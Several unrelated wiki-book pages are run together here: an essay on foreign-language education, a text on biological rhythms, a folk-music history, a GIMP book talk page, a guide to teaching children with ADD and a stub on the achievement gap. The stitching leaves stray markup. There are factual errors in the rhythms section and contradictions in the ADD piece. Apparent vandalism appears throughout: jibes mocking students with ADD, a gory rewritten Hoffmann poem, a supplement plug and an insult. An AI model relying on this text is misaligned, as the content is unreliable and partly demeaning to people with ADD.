The main reason behind learning another language is globalization: we have to recognize others and accept them, whether they are in our society or anywhere else. Foreign language also prepares students with greater knowledge of the different cultures of the world.  


== '''''Globalization''''' ==


Language education is a way to promote communication, cultures, connections, comparisons, and communities (which are the five goals of the national standards for foreign language learning). If a child has contact with other cultures before he/she begins to see the external world as a threat, it will help comprehension and understanding. Respect of others is critical and can be achieved through education of a new language. The holistic learning experience of a foreign language provides children a natural process in which they have interpersonal experiences with members of the target culture/language and acquire an acceptance of diversity in communities, both within and beyond the school setting. (www.cal.org/ericcll/systempubs.html)
According to the CIA World Fact Book, only 5.6 % of the world's total population speaks English as a primary language… and more than 80 % does not speak English. (http://www.vistawide.com/languages/why_languages.htm)


In our interdependent world, being able to communicate, understand and value other cultures is essential on the economic, politic and educational points of view. Being able to see through the perspective of someone else is incredibly powerful and crucial. 
Last but not least, how could the multiculturalism of today’s society be forgotten? We must see the cultural, linguistic and intellectual capital of our schools through the culturally and linguistically varied students attending them as fantastic intellectual resources, not as threats to the community. Students exposed to different cultures can get a greater understanding of others by encouraging a positive reception for the customs and achievements of persons others than the ones in their own communities.



== '''''Conclusion:''''' ==


Foreign languages education is necessary whether it is to help the American students to become good citizens, keep the United States of America in the political, commercial or military plan or be part of the internationalization of the world.

      <text xml:space="preserve">==Biological Rhythms==

Our surrounding undergoes predictable, cyclical fluctations as a result of changes in seasons, or the time of day. When events and conditions repeat in a rhythmic pattern, the ability to predict, anticipate, and prepare for them is a highly beneficial trait. Not surprisingly, most animals are able to adjust their physiology, behavior, and life cycles to the upcoming conditions. Owls begin to stir in the late afternoon and evening, awaiting the emergence of small mammals at dusk. Ground squirrels gather rations and pack on fat reserves in the fall in preparation for cold winters spent underground. Moose reproductive cycles match the birth of fawns in the spring to the rich emergence of forage at that time. Human core body temperature cycles with a low during the middle of their sleep cycle and highs around lunch time and early evening. Bioluminescent fireworm of Bermuda time their romantic gettogethers to diurnal as well as lunar cycles. Adult amergence of 17-year cicadas, or bamboo flowering every few decades, is closely timed across entire populations. '''Chronobiology''', the science that describes timing in biological clocks and their associated rhythms, makes extensive use of terms and concepts derived from engineering disciplines. Rhythmic events are described as to their period (i.e., the amount of time it takes to go from peak to peak), frequency (i.e., the number of cycles completed within a specific unit of time), amplitude (i.e., the distance between peaks and average), and phase (i.e., the timing of the rhythm relative to some objective, external point in time).

The timing of a cycle's events can operate at many different time frames. Some cycles are link to obvious external patterns including:
*sun: '''circadian''' refers to 24h period length, '''ultradian'''  to cycles exceeding 24h
*moon: '''lunar''' cycles, lasting 24.8h, are controlled by the phase of the moon, while '''tidal''' rhythms of 12.4h are determined by the timing of its gravitation pull
*tilt of earth's spin axis: a '''circannual''' rhythm spans events that repeat on a 12 month basis corresponding to the Earth's seasons

===Biological Clocks===
Many observed rhythms in physiology and behavior often crucially depend on the presence of endogenous cycles and their production through biological clocks. Periodic rhythms, which are not simply responses to external periodic cues, have been documented for most living beings, including bacteria, fungi, plants, and animals. '''Biological clocks''' are self sustaining oscillators which will continue a period of '''free-running''' cycling even in the absence of external cues. However, clocks are usually linked to and can be reset by the environment via cues (i.e., Zeitgeber). Such '''entrainment''' keeps an organisms clock synched to its surrounding conditions.

Circadian clocks must contain a minimum of three basic elements: (1) input pathway(s) relay environmental information to a circadian pacemaker; (2) the endogenous pacemaker (oscillator) generates temporal patterns; and (3) output pathway(s) for the pacemaker to regulate output rhythms. A search for biological clocks commonly attempts to isolate an organism from its external cues and to search for the continuation of rhythmic patterns. Isolation from all possible (e.g., geophysical, magnetic, or radiation) cues remains a difficult task, however, animals will display cyclical activity patterns even when maintained in constant conditions aboard a spacecraft orbiting far above the earth.

Genetic components of the biological clock have emerged from research on the fruit fly where mutant lines of flies displayed abnormal cycling, including a shorter period, a longer one and its complete absence in yet another. All three mutations were mapped to the same gene - termed period or ''per''. Disruption of the same gene in human sleep disorder underscored the conserved nature of the molecular circadian clock throughout evolution. 

Biological Clocks exhibit a high degree of inheritance, independence of temperature and social conditions, strong resistance to pharmacologcial and chemical disruption, and may even be expressed at the level of single cells. Entrainment is often limited to a narrow range of possible outcomes, may utilize a small set of cues, and its timing is critical. Human circadian rhythms free-run at slightly longer than 24 hours and are reset to the normal 24h day by light cues. Humans are able to readily adjust to a  23-25h day  but not to a 22 or 28h day. Biological rhythms may be expressed over many different time frames, and entrainment of one clock may disrupt multiple rhythmic changes suggesting a basic linkage of patterns (e.g., circadian activity and estrous cycles in mammals).

Karl von Frisch's search for biological clocks characterized a periodic, night-time lightening of skin chrmatophores in minnows.  These cyclical changes in skin pigments persisted even in blinded individuals. With damage to the pineal gland, however, fish were no longer able to change skin color in rhythmic fashion. The existence of extra ocular light perception in the brain's pineal gland allowed the fish to change color even when ocular light perception was disrupted.

====Molecular Basis of Cellular Clocks====
The presence of rhythmic patterns even at the level of single cells indicates the presence of cell-autonomous circadian mechanisms. In the fruit fly (''Drosophila'') two proteins (PER and TIM) play a role in rhythmic patterns at the cellular level. The two proteins form a dimer complex in the nucleu, binds to the gene's promoter, and inhibits production of further ''per'' and ''tim'' RNA. With gene transcription of the component proteins turned way down, few new PER and TIM proteins are made. Existng PER-TIM complexes are gradually degraded, and decrease in numbers as they are not replaced. The protein-induced inhibition of ''per'' and ''tim'' transcription weakens, mRNAs for them increase, leading to enhanced PER and TIM protein, complex formation between them, and renewed inhibition of ''per'' and ''tim'' gene transcription. In the mammalian suprachiasmatic nucleus entrainment derives from light-induced expression of transcription factors (i.e., immediate early genes, IEG), which control the expression of timing genes down-stream. At the output level, the circadian clock controls the transcription of a number of genes such as CREM (i.e., CRE modulator).

====Suprachiasmatic Nucleus====
The mammalian circadian system relies on oscillating neurons grouped within the suprachiasmatic nucleus (SCN), a distinct group of cells located in the hypothalamus. Its destruction results in the complete obliteration of regular sleep/wake rhythms. Cultured SCN cells maintain their own rhythm in the absence of external cues. The SCN receives information on day length from the retina, interprets it, and during the dark phase enhances secretion of the hormone melatonin from the pineal gland.

===Sleep===

Sleep, an essential state of natural rest, is observed in most animals. It is characterized by reduced voluntary body movement, decreased reaction to external stimuli, and a loss of consciousness. Humans sleep an average of 7.5 hours, during which they proceed in around 100 minute cycles of two broad types. '''Rapid eye movement''' (REM) occupies roughly 25% of sleep time. During this stage the body shows a loss of skeletal muscle tone while the brain is quite active. Electroencephalography (EEG) shows a mixture of frequencies that is similar in appearance to the wakeful EEG and coincides with periods of intense dreaming. '''Non-rapid eye movement''' (NREM) sleep occupies most of the sleep time and is characterized by frequent limb movements and sleep walking while the brain exhibits reduced activity and little dreaming.

The inherent '''function of sleep''' is not yet completely understood. Sleep, which affects the immune system and metabolism, supports a restorative function with increases in wound healing and the production of anabolic growth hormones. Sleeps is marked by a variety of physiological processes of growth and rejuvenation of the organism's immune, nervous, muscular, and skeletal systems. In newborns sleep appears to play a critical role in establishing proper functional connectivity in the brain. A number of studies suggest the existence of a correlation between sleep and the many complex functions of memory. Memory and learning involve nerve cell dendrites sending information to the cell body to be organized into new neuronal connections. Sleep which reprocesses the days events in the absence of external information is processed by these dendrites as memories are solidified and knowledge is organized [Saper and Stickgold 2005].

      <text xml:space="preserve">Music held to be typical of a nation or ethnic group, known to all segments of its society, and preserved usually by oral tradition. Knowledge of the history and development of folk music is largely conjectural. Musical notation of folk songs and descriptions of folk music culture are occasionally encountered in historical records, but these tend to reflect primarily the literate classes' indifference or even hostility. 

As Christianity expanded in medieval Europe, attempts were made to suppress folk music because of its association with heathen rites and customs, and uncultivated singing styles were denigrated. During the Renaissance, new humanistic attitudes encouraged acceptance of folk music as a genre of rustic antique song, and composers made extensive use of the music; folk tunes were often used as raw material for motets and masses, and Protestant hymns borrowed from folk music. 

In the 17th century folk music gradually receded from the consciousness of the literate classes, but in the late 18th century it again became important to art music. 

In the 19th century, folk songs came to be considered a &quot;national treasure,&quot; on a par with cultivated poetry and song. National and regional collections were published, and the music became a means of promoting nationalistic ideologies. 

Since the 1890s, folk music has been collected and preserved by mechanical recordings. Publications and recordings have promoted wide interest, making possible the revival of folk music where traditional folk life and folklore are moribund. 

After World War II, archives of field recordings were developed throughout the world. While research has usually dealt with &quot;authentic&quot; (i.e., older) material not heavily influenced by urban popular music and the mass media, the influence of singer-songwriters such as Woody Guthrie, Pete Seeger, Joan Baez, and Bob Dylan expanded the genre to include original music that largely retains the form and simplicity of traditional compositions.

== Suggestion ==
I suggest create a book about how to draw [[w:floor plan|floor plan]]s using the GIMP. --[[User:77.209.28.225|77.209.28.225]] 19:48, 14 March 2007 (UTC)

== The GIMP -&gt; GIMP ==
Shouldn't the whole book be renamed to simply &quot;GIMP&quot;?  At least that's the official name since something like 2.4, IIRC. --[[User:Rubik-wuerfel|Rubik-wuerfel]] ([[User talk:Rubik-wuerfel|talk]]) 21:30, 17 December 2008 (UTC)
: Wikipedia has &quot;[[W:GIMP|GIMP]]&quot; while &quot;[[W:The GIMP|The GIMP]]&quot; is only a redirect.
: Can we have a link to an announcement of the change of the official name? In any case, http://www.gimp.org/ now speaks of &quot;GIMP&quot; instead of &quot;The GIMP&quot;.
: Given the official name is now &quot;GIMP&quot;, I am for moving the book to the new name. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 07:50, 23 April 2009 (UTC)
:: I've got nothing against it, but it is quite a bit of work. There are over 50 pages (with few redirects though, but some are not listed) currently. So yes, I support this idea. [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 13:59, 23 April 2009 (UTC)
::: {{done}}. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 09:20, 27 April 2009 (UTC)

== Merger ==

I have removed &lt;nowiki&gt;{{mergefrom|The GIMP -- Noob to Pro}}&lt;/nowiki&gt;, as the book ''[[The GIMP -- Noob to Pro]]'' has nothing to offer to &quot;The GIMP&quot; book. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 17:44, 21 April 2009 (UTC)

== Recent changes ==

The recent edits have been quite bold. I've got nothing against them, except for that I prefered the older structure of [[The GIMP#Contents|Contents]], that made it easier to manage. Due to this, could we please discuss possible changes? [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 14:49, 22 April 2009 (UTC)
: So what exacly do you find better about the old structure of the contents? Like, do you prefer having external links on the contents page? Or do you prefer using headings in tables of contents? --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 16:42, 22 April 2009 (UTC)
::As I wrote, I was talking about the contents, so yes I'd prefer headings in there. It was (at least for me) much easier to manage the list. So even if only heading of every main sections are back, it would be much better IMHO. [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 16:55, 22 April 2009 (UTC)
:::I prefer numbered list items to headings in ToC, and have performed a similar change in several other books in the past, so far without opposition. I do not see how headings make the management easier than list items in a nested list. Can you try to explain to me how headings make the management easier? --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 16:59, 22 April 2009 (UTC)
::::It is easier IMHO, because it makes editing one section much easier. So in general, you can edit only some part you want to, and not look trough the whole list. When it comes to links under the headings, they should still be numbered, just the main 'chapters' made still editable. That's why I think management is easier then. [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 17:40, 22 April 2009 (UTC)
::::: Okay, but that does not really have to do with management, only with the ease of editing. The nice standard appearance of a numbered list should take precedence over the ease of editing, IMHO. The ToC is not all that long that a single editing section of &quot;Contents&quot; should not suffice, IMHO anyway.
:::::On a related note, I for one would remove all the boldface from the ToC, that boldface that you have added. Preferences differ, unforntunately. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 17:45, 22 April 2009 (UTC)
::::::I made it bold, to make 'titles' more easily distinguishable from the rest of contents. If you see that as a problem, then revert it. [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 13:10, 23 April 2009 (UTC)
:::::::Then I'll revert the boldface. I propose that instead of boldface, there can be  chapters, containing an overview of the topic. Like, [[The GIMP/Filters]] can introduce what filters are. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 13:14, 23 April 2009 (UTC)
: Just for the record, I have noticed you have moved the old front page to [[The GIMP/Cover]]. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 16:53, 22 April 2009 (UTC)
::Yes, is there anything wrong with that? [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 16:55, 22 April 2009 (UTC)
::: No problem at all. That is why I said &quot;Just for the record&quot;. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 16:59, 22 April 2009 (UTC)
::::Sorry, didn't see that. [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 17:40, 22 April 2009 (UTC)

== Navigation template ==

I'd like to use {{tlx|chapter navigation}} thoughout the book, instead of the book-specific {{tlx|The_GIMP/Nav}}. The proposed template {{tlx|chapter navigation}} is used in several books, including the featured [[Rhetoric and Composition]]. Is this okay with you? --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 13:16, 23 April 2009 (UTC)
:I assume yes, but I think waiting at least a day or two, for opinions for anybody else would be good. Though the current template allows more flexibility, then {{tlx|chapter navigation}} (custom names of pages and so on). [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 13:55, 23 April 2009 (UTC)
:: I can wait if you wish. Still, from looking at the recent history of &quot;The GIMP&quot;[http://en.wikibooks.org/w/index.php?title=Special:RecentChangesLinked&amp;limit=500&amp;target=Category%3AThe+GIMP&amp;days=30], you are the only recent major contributor to the book, so I would be surprised if other people objected to a replacement of a non-standard template with a standard one, used in several featured books. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 14:24, 23 April 2009 (UTC)
:::As far as I know there is [[User:Chelseafan528|one more person]] (editing this book for some time now) that appears from time to time. So I guess waiting until tomorrow's noon won't be too bad.

* Hello all

I would like to use this template in the  [http://he.wikibooks.org/wiki/GIMP Hebrew GIMP wikibook]. As far as I understand, since this this template doesn't seem to exist yet in the Hebrew wiki, I will need to create this template page there, and fill it with the relevant markup, then adjust the directionality etc.
Did I get it right? Anyway, at a quick glance I don't see where the markup lies, and would love to get a hint and save me some time searching. Or, of course, correcting my understanding of the process if I'm wrong.

Thanx

== Any1 interested in scripting chapter? ==

Hi all, 

I am writing  a Script-Fu Chapter for GIMP at the Moment (unfortunatly only in German),
if you understand the language, check it out, tell me your view.

Perhaps &quot;Scripting&quot; is a thing which is also interesting for Wikibooks/en...?

URL (GIMP/Wikibook/Script-Fu): http://de.wikibooks.org/wiki/GIMP/_Band5/_Script-Fu

Many thx taking your time, Andreas_P

Hi Andreas
I would love to see a scripting chapter!

      <comment>/* What is ADD? */</comment>
      <text xml:space="preserve">{{hiddenh3|How can we learn to understand children with ADD?}}

Teaching children can be a difficult task because they all tend to be different.  Some learn fairly quick while others may take longer.  Some are quiet and attentive and some are not.  Imagine trying to teach a child with a learning disorder.  A disorder called Attention Deficit Disorder.  To know how to teach a child with ADD, we must first educate ourselves on the subject.

Please note the style of the paragraph above, characterized by sentence fragments and statements that do not follow from preceding statements in a logical and orderly fashion.  Such are the hallmarks of the prose generated by students suffering from ADD.

==What is ADD?==
Attention Deficit Disorder &quot;is a neurological syndrome whose classic defining triad of symptoms including impulsivity, distractibility, and hyperactivity or excess energy&quot; (Driven to Distraction, 6).  It is not a learning disability, it is a learning disorder; it &quot;affects 3 to 5 percent of all children, perhaps as many as 2 million American children&quot; (Mathews ix).  ADD affects more boys than girls.  Children with ADD have a hard time focusing on things like school work, but they can concentrate on things they enjoy doing like playing games or watching their favorite cartoons or writing sentences without punctuation.  These children tend to get into a lot of trouble, because they &quot;engage in risky behaviors, get into fights, and challenge authority&quot; in order to stimulate their brain, since their brain can not be stimulated by normal methods (Lawlis 7). ADD affects relationships with other peers because other children can not understand why they act the way that they do or why they spell they way they do or that their maturity level is different.  ADD children like to play with younger children because they can relate to them better.  Sadly, there are no cures for ADD but some people do grow out of it. The others usually learn how to deal with it.  No one has been able to prove what causes this disorder, but there are some theories. These theories include environmental agents such as the use of cigarettes and alcohol while pregnant, a brain injury, food additives, sugar, and genetics(NIMH 7). Children with ADD have a hard time focusing and are easily distracted, but with teachers that are educated on the subject, and know to use &quot;who&quot; instead of &quot;that&quot; to refer to people, will know what kinds of strategies to use in order to teach children with the disorder.  ADD and ADHD are believed by some researchers to be caused by various biochemical malfunctions of the brain.  Specialists are finding that diet, exercise, nutritional supplements, and parenting strategies can either take the place of, or supplement prescription medications.  Dr. Daniel Amen, Assistant Clinical Professor of Psychiatry and Human Behavior at the University of California, Irvine School of Medicine, has shown in his research that there are actually 6 distinct types of ADD, each with a different approach to treatment.

==Types of ADD==
There are two types of ADD; they are hyperactive-impulsive (ADHD) and inattention.  The difference is the ADHD child can not stay still for even a minute and the inattentive child daydreams.  One thing they do have in common is the inability to stay focused without help.  They must be constantly reminded of a task to keep them from being distracted by something else.

===ADHD===
In 1845, Dr. Heinrich was the first to describe ADHD.  He wrote a poem called &quot;The Story of Fidgety Philip&quot;.  &quot;This was an accurate description of a little boy who had ADHD&quot; (NIMH 2).  Children with ADHD are in fact fidgety; they are constantly moving some part of their body, jumping and climbing, even in places where they should not.  They wiggle around in their seats, tap their feet on the floor, talk a lot, etc...  They do things without thinking first like blurting out an answer before the teacher calls on them or crossing the street before looking both ways.  They have a hard time taking turns, for example, on the slide at the playground or waiting in line for the water fountain.  These children are full of never ending energy.  Dr. Grant Martin, author of &quot;The Attention Deficit Child,&quot; did an interview with a family that had a child with this disorder and this is what they had to say:  &quot;Whenever we take Fred out in public, we spend all of our time reminding him to sit down or be quiet.  He never stops.  He's impossible to take to church, so we've about decided not to go anymore.  He's always moving ninety miles an hour&quot; (3).  Parents who have to deal with this problem are usually left feeling embarrassed and wondering &quot;where did we go wrong?&quot;

by Heinrich Hoffmann 

The Story of Fidgety Philip
 
&quot;Let me see if Philip can&lt;br&gt;
Be a little gentleman; &lt;br&gt;
Let me see if he is able &lt;br&gt;
To sit still for once at table.&quot; &lt;br&gt;
Thus spoke, in earnest tone, &lt;br&gt;
The father to his son; &lt;br&gt;
And the mother looked very grave &lt;br&gt;
To see Philip so misbehave. &lt;br&gt;
But Philip he did not mind &lt;br&gt;
His father who was so kind. &lt;br&gt;
He wriggled &lt;br&gt;
And giggled, &lt;br&gt;
And then, I declare, &lt;br&gt;
Swung backward and forward &lt;br&gt;
And tilted his chair, &lt;br&gt;
Just like any rocking horse;- &lt;br&gt;
&quot;Philip! I am getting cross!&quot; &lt;br&gt;
 
See the naughty, restless child, &lt;br&gt;
Growing still more rude and wild , &lt;br&gt;
Till his chair falls over quite. &lt;br&gt;
Philip screams with all his might, &lt;br&gt;
Catches at the cloth, but then &lt;br&gt;
That makes matters worse again. &lt;br&gt;
Down upon the ground they fall, &lt;br&gt;
Glasses, bread, knives forks and all. &lt;br&gt;
How Mamma did fret and frown, &lt;br&gt;
When she saw them tumbling down! &lt;br&gt;
And Papa made such a face! &lt;br&gt;
Philip is in sad disgrace. &lt;br&gt;
 
Where is Philip? Where is he? &lt;br&gt;
He's fallen on the ground, you see.&lt;br&gt; 
Blood is spurting up and from him- &lt;br&gt;
He has pulled a knife down on him! &lt;br&gt;
What a terrible to-do! &lt;br&gt;
Philip has been cut in two! &lt;br&gt;
Here a knife, and there a fork... &lt;br&gt;
Philip, this is naughty work. &lt;br&gt;
Table all so bare, and ah! &lt;br&gt;
Poor Papa and poor Mama &lt;br&gt;
Look down upon their child's corpse&lt;br&gt; 
And begin to cook a second course.&lt;br&gt;
http://www.fln.vcu.edu/struwwel/philipp_e.html
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

===Inattention===
Unlike ADHD, inattention children can sit still but often drift off into space and daydream.  Anything can catch their attention and distract them.  Some distracting things can be air conditioners, a fan blowing a piece of paper around that is taped to the wall, a bird outside a window, or some one walking down the hallway.  &quot;Children who are inattentive have a hard time keeping their minds on any one thing and may get bored with the task after only a few minutes&quot; (NIMH 3).  They are forgetful and unorganized.  They will forget to write down directions for homework, misplace their homework, forget to bring their books home so that they can do their homework, and make a lot of careless mistakes.  Dr. Grant Martin, author of &quot;The Attention Deficit Child,&quot; did an interview with a family who had a child with this type of ADD and this is what they had to say:  &quot;Sally daydreams constantly.  We know she's bright, yet she's flunking several of her classes.  The other day her dad and I struggled with her for several hours to get her homework done.  At first she said she didn't have any.  We checked her notebook and found the assignment sheet.  She was tearful, but we finally completed the two pages of math.  And would you believe it, the next day we got a call from her teacher telling us Sally hadn't turned in her work&quot; (3).  This situation can leave the child's family and teachers racking their brains trying to figure out how a child can struggle through all of that hard work and forget about it so soon after.

==The Ritalin Controversy==
Of all the issues that surround AD/HD, the use of psychostimulainte drugs like methylphenidate (Ritalin®), dextroamphetamine (Dexedrine®), and amphetamine (Adderall®) is probably the biggest and most controversial.   Many American adults and teens have been exposed to Ritalin as the wonder drug that most effectively treats AD/HD, but unless they have taken it or they have a child that is taking it, few are fully aware of its negative physical and social side effects.  Since children spend so much time in school, teachers end up playing a large role in assessing behavior and identifying symptoms associated with AD/HD which could lead to Ritalin being prescribed.  Therefore, the more informed teachers are about Ritalin, the better they can join together with parents and doctors to make the best decisions for the child. Ritalin was first patented in 1954 by the CIBA pharmaceutical company.  It was not used in the treatment of AD/HD until the 60's, and is currently the most prescribed drug for AD/HD in the world. (Wiki)  Although many studies have shown that Ritalin decreases the three main symptoms of AD/HD (inattention, hyperactivity/impulsiveness, and aggression) there are also many negative side effects.  Ritalin is known to create: loss of appetite, difficulty sleeping, headaches, stomachaches, and even contribute to the development of a tic.  Beyond the negitive physical aspects of Ritalin use, there are many social problems that have arisen as Ritalin has become more widely used.  The DEA reports ''Methylphenidate, a Schedule II substance, has a high potential for abuse and produces many of the same effects as cocaine or the amphetamines. The abuse of this substance has been documented among narcotic addicts who dissolve the tablets in water and inject the mixture.'' and ''the increased use of this substance for the treatment of ADHD has paralleled an increase in its abuse among adolescents and young adults who crush these tablets and snort the powder to get high. Youngsters have little difficulty obtaining methylphenidate from classmates or friends who have been prescribed it. Greater efforts to safeguard this medication at home and school are needed.''(usdoj.gov) Perhaps the least studied but equally important side effect Ritalin can cause is behavioral.  A child could learn to associate taking a pill with &quot;being normal&quot; or acting responsibly.  It isn't hard imagine a parent or teacher who is tired of struggling with a difficult child and turns to Ritalin for their own relief instead of exhausting other solutions that don't use drugs.

==Social Acceptance==
Anthony Kane, a MD physician, stresses the importance of healthy peer relationships for the normal development of a child.  Statistics show that 60% of children who have ADHD suffer from peer rejection.  “ADHD children are more frequently disliked or neglected by their peers.  It is difficult to determine the factors that make a child unpopular, but children who frequently display aggressive or negative behavior are more likely to be rejected by their peers” (Kane).  Many of the symptoms of that a child experiences with ADHD for example, being out of their seats or yelling at inappropriate times, causes them to behave differently than their peers who do not have this disorder.  In result, children with ADHD are often rejected because they appear to be different.  

It is important to try to help children with ADHD who lack the appropriate social skills early on because as they get older their social skills seem to get worse.  If their inappropriate behavior continues it could lead to further social rejection and the inability for them to relate to others. (Kane). 

==Good Teaching Strategies==
Teachers can do several things to help an ADD child stay better focused in the class room.  They can place the child away from any distractions.  For example, sitting them close to the teacher's desk turned where they can not see the other children or siting them closer to children who are well behaved and remember to raise their hand and wait to be called on can be a good influence.  Writing directions and assignments on the board are good ideas since ADD children often have problems focusing long enough to hear them.  The teacher can use a folder or a notebook to put homework assignments in to send home everyday and have the parents sign it to be sure their children brought it home.  The teacher also needs to make known what classroom rules are and what the consequences will be if a rule is broken.  According to Sandra Reif, author of &quot;How to Reach and Teach ADD/ADHD Children&quot;, &quot;Time outs or time aways for ADHD students are necessary...these children often can't handle all of the stimulation in a classroom and become worked up and sometimes out of control&quot; (20).  Positive reinforcement is &quot;the best behavioral management strategy and the one that builds self-esteem an respect&quot; (Reif 20).  Teachers should always look for positive actions from the children and praise them for it; by doing this, the child might feel better about themselves and will want to do more good things in order to receive more praises.  If the child only hears negative things about themselves, they tend to give up and act out.  They already feel like outsiders because they do not relate to children their own age that well due to their maturity level.  Teachers can say something like, &quot;I am very proud of you for waiting your turn&quot; or &quot;Thank you for being so polite.&quot;  Rewards can also be given for good behavior at the end of the week; this gives children a reason to want to do well in school.  Rewards work well, since ADD children can focus on things they like.  Depending on the child, in some cases, the ADD child may need to go to a special education class for part of the day or see a tutor for one-on-one time.  And in extreme cases the child may need to go to a school that specializes in ADD children.

Most teachers are aware that every child is different and that each child learns better under certain circumstances. There are several tips that teachers can use in their classroom to meet the needs of the children in their class who have ADHD. Chris Dendy suggest these following accommodations: un-timed tests, use of calculator or computer, modification of assignments (ex: few math problems but still masters concepts), reduced demands on limited working memory capacity, written homework assignments given by teachers, and utilization of note takers or guided lecture notes. He also suggest that accommodations should be individualized to best meet the needs of each individual who may have ADHD.  

Another study gives more vital information on how teachers can provide a proper learning environment and how to give instructions to students with ADHD. This study published by ERIC lists several tips on how to establish a better learning environment:

*Seat students with ADHD near teacher’s desk but still include them as a part of the regular class seating.
*Place them up front.
*Surround them with good role models.
*Encourage peer tutoring.
*Avoid distracting stimuli such as, as air conditioners, high traffic area, or doors and windows.
*Avoid change.

There are also helpful tips for teachers while giving instructions to children with ADHD.  These tips include:
*Maintain eye contact during verbal instruction.
*Make direction clear and concise. Be consistent with daily instructions.
*Simplify complex directions. 
*Make sure students comprehend the instructions before beginning the task.
*Repeat instructions in calm, positive manner, if needed. 

There are many other strategies that teachers can use to not only help keep order in the classroom but to help the child as well.  Some strategies to manage the behavior of a child with AD/HD involve using progress charts to reward good behavior and to give the student opportunities to release energy and stay involved with the classroom by having them run errands, erase chalkboards, or pass out materials.  Teachers can also help these students stay on task by repeating a short, simple version of the directions throughout the assignment, having students highlight important information on worksheets, and by breaking the assignment down in parts.  Other things teachers can do that benefit an AD/HD student in the classroom is giving them lots of examples when teaching a new idea, using a game or manipulative format for lessons, and allowing the student more time to complete difficult assignments or tests.  Something important that teachers should keep in mind is that being patient, consistent, having high positive expectations and using positive reinforcement instead of punishment are all influential characteristics when dealing with AD/HD children. (McIntyre)

==Conclusion==
Children with ADD have a learning disorder that causes them to have a hard time concentrating on things, especially in school.  There are two different types of ADD; they are hyperactive-impulsive (ADHD) and inattention.  Both types have different symptoms but share the inability to focus.  Teachers are usually the first to recognize if a child has ADD and are a reliable source in 
making the diagnosis since they are around other children in the same age range. Teachers can work with ADD children and used certain teaching strategies to manipulate the minds of ADD children to help them focus better.  The diet changes recommended are to: Increase protein intake, especially at breakfast.  Examples would be bacon and eggs, or even a protein bar or shake (for those who are rushed in the mornings); Increase complex carbohydrates, such as vegetables, fruit, whole grains and beans; Decrease simple carbohydrates, such as white bread, white rice, white potatoes, sugar, and other sweets.  Supplements can be as simple as &quot;Attentive Child&quot; TM, which has many of the individual ingredients found to increase dopamine levels and blood flow to the brain.  DHA from purified fish oil has also been shown to help with mood, memory, and neurological function.   The exercise recommendations are for 30-45 minutes of aerobic exercise 5 times a week.  Parenting strategies are to ask the questions and check the answers. &quot;Let me see your homework assignments for this evening&quot;, would be a good example. Check the homework once it is finished, even better is to sit with your child as they do the homework to make sure they understand the concepts.  Passive parenting does not work with a child with ADD.  Speaking from experience, I have Combined  ADD and my daughter has Inattentive ADD (she could be the poster child!).  Diet, supplements, and exercise have made a positive difference in my daughter, both at school and at home.

{{question-answer|question=What are some teaching strategies that a teacher can use to help keep an ADD child's attention?  There are no right or wrong answers.
|answer=There are a variety of teaching strategies, for students diagnosed with attention deficit disorder (ADD).   These methods may vary depending on the needs of the child.  Here are some ideas that are typically successful when working with students diagnosed ADD.  A teacher should placing a child with ADD close to a child who is self-disciplined, so the other child can set a good example of what the child with ADD should be doing.  Also, avoid placing a child with ADD in an area with many distractions, for instance around the door, window, or another child with a disability.  Following directions is hard for students with ADD, so writing directions on the board can compensate for problems listening and remembering instruction.  Another tool for following directions is using a notebook or planner, so the student can have permanent reminders of what they should be doing for homework or an in-class activity.  The problem maybe remembering the planner everyday!  
Another factor with students with ADD is that they might have problems calming down. Sometimes these children need a break from the stimuli to prevent behavior problems and to quickly correct them.  Praise is beneficial tool for all students, including those with special needs.  Every child, even the most misbehaved child, does something right in a day, and they should be aware that they can do something well.  Many strategies will be needed when working with students diagnosed with ADD, but taking the time to make accommodations can lead to a highly functioning child and classroom. &amp;mdash;Jamie Kaufman}}

      <text xml:space="preserve">==The Achievement Gap in America’s Schools==
Written By: Cathy Sparkman

==Introduction==

	The achievement gap issue between poor minority
children and middle class white children is a highly important 
educational challenge; one which needs to be addressed.  Even though 
poor children are given the same public school education as middle 
class children they often are not as successful.  Explanations and the 
concern for the occurrence of the achievement gap vary and have 
become controversial, especially since the effort to close the 
achievement gap has suggested the need for education reform. This 
article suggests social-class trends which widen the gap and those
practices which help close the gap.
kiss my ass !

==Definition==

